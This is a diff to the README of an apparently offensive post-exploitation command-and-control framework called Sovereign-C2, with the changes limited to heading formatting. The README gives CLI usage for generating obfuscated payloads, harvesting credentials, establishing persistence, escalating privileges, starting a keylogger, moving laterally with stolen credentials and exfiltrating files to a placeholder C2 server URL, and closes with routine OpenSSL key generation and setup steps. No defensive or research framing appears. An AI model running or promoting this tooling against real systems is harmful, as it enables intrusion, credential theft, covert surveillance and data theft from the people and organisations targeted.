@@ -29,69 +29,69 @@ This framework provides advanced post-exploitation capabilities with a focus on 
 
 The CLI provides various commands to interact with the framework.
 
-# List all registered agents:
+List all registered agents:
     python cli/cli.py list_agents
 
-# Send a command to a specific agent:
+Send a command to a specific agent:
     python cli/cli.py send_command --agent_id AGENT_ID --command "Your command here"
 
-# Generate an obfuscated payload for a specific platform:
+Generate an obfuscated payload for a specific platform:
     python cli/cli.py generate_payload --platform PLATFORM
 
-# Harvest credentials:
+Harvest credentials:
     python cli/cli.py harvest_credentials
 
-# Establish persistence:
+Establish persistence:
     python cli/cli.py establish_persistence
 
-# Escalate privileges:
+Escalate privileges:
     python cli/cli.py escalate_privileges
 
-# Gather system information:
+Gather system information:
     python cli/cli.py gather_system_info
 
-# Exfiltrate data:
+Exfiltrate data:
     python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
 
-# Start keylogger:
+Start keylogger:
     python cli/cli.py start_keylogger --log_file_path /path/to/log_file
 
-# Move laterally:
+Move laterally:
     python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
 
 # Example Commands
 
-# Listing all registered agents:
+Listing all registered agents:
     python cli/cli.py list_agents
 
-# Sending a command to a specific agent:
+Sending a command to a specific agent:
     python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"
 
-# Generating a payload for Windows:
+Generating a payload for Windows:
     python cli/cli.py generate_payload --platform windows
 
-# Harvesting credentials:
+Harvesting credentials:
     python cli/cli.py harvest_credentials
 
-# Establishing persistence:
+Establishing persistence:
     python cli/cli.py establish_persistence
 
-# Escalating privileges:
+Escalating privileges:
     python cli/cli.py escalate_privileges
 
-# Gathering system information:
+Gathering system information:
     python cli/cli.py gather_system_info
 
-# Exfiltrating data:
+Exfiltrating data:
     python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
 
-# Starting a keylogger:
+Starting a keylogger:
     python cli/cli.py start_keylogger --log_file_path /path/to/log_file
 
-# Moving laterally:
+Moving laterally:
     python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
 
-# Logging and Reporting
+Logging and Reporting
 
 Logs are stored in the c2_server.log file located in the c2_server directory. This file contains detailed information about agent activities and commands executed.
 
@@ -105,25 +105,25 @@ To add new post-exploitation modules, create a new Python file in the c2_server/
 
 # Key Generation and Conversion
 
-# RSA Key Generation
+RSA Key Generation
 To generate a pair of RSA keys, you can use the OpenSSL toolkit. Run the following commands to generate a private key and a public key:
 
-# Generate a private key:
+Generate a private key:
     openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
 
-# Extract the public key from the private key:
+Extract the public key from the private key:
     openssl rsa -pubout -in private_key.pem -out public_key.pem
 
-# AES Key Generation
+AES Key Generation
 To generate an AES key, you can use OpenSSL as well:
 
-# Generate a 256-bit AES key:
+Generate a 256-bit AES key:
     openssl rand -base64 32 > aes_key.txt
 
-# Conversion to XML
+Conversion to XML
 For certain applications, you may need to convert these keys into XML format. Below are examples of how you might format the keys in XML.
 
-# Example RSA Private Key in XML
+Example RSA Private Key in XML
 <RSAKeyValue>
   <Modulus>...</Modulus>
   <Exponent>...</Exponent>
@@ -135,13 +135,13 @@ For certain applications, you may need to convert these keys into XML format. Be
   <D>...</D>
 </RSAKeyValue>
 
-# Example RSA Public Key in XML
+Example RSA Public Key in XML
 <RSAKeyValue>
   <Modulus>...</Modulus>
   <Exponent>...</Exponent>
 </RSAKeyValue>
 
-# Example AES Key in XML
+Example AES Key in XML
 <KeyValue>
   <Key>
     <Algorithm>AES</Algorithm>
@@ -150,7 +150,7 @@ For certain applications, you may need to convert these keys into XML format. Be
   </Key>
 </KeyValue>
 
-# Secure Management of Keys
+Secure Management of Keys
 Ensure that keys are not stored in the repository. Instead, load them from secure storage at runtime. Below is an example of how you can load keys in a Python script:
 
 # import os
@@ -187,28 +187,28 @@ aes_key = load_aes_key(aes_key_path)
 
 print("Keys loaded successfully.")
 
-# Setting Up Environment Variables
+Setting Up Environment Variables
 You can set up environment variables to point to the key file paths:
 
-# Example .env File
+Example .env File
 PRIVATE_KEY_PATH=/path/to/private_key.pem
 PUBLIC_KEY_PATH=/path/to/public_key.pem
 AES_KEY_PATH=/path/to/aes_key.xml
 
-# Running the Project
+Running the Project
 To run the project, follow the instructions below:
 
-# Clone the repository:
+Clone the repository:
     git clone https://github.com/your-repo/Sovereign-C2.git
     cd Sovereign-C2
 
-# Install dependencies:
+Install dependencies:
     pip install -r requirements.txt
 
-# Run the CLI:
+Run the CLI:
     python cli/cli.py
 
-# Set up the environment variables:
+Set up the environment variables:
     export $(cat .env | xargs)
 
 # Contribution
